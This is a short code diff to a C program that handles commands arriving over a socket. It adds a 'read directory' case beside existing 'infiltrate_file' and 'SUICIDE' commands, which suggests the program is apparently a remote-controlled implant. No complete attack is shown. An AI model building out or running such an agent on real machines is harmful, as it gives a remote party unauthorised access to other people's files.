@@ -81,6 +81,11 @@ int main()
                 infiltrate_file(sockfd, (struct inf_req *)req);
                 break;
 
+            case READ_DIR:
+                puts("Read directory command received");
+                read_directory(sockfd, (struct dir_req *)req);
+                break;
+
             case SUICIDE:
                 puts("Suicide command received");
                 is_suicidal = true;
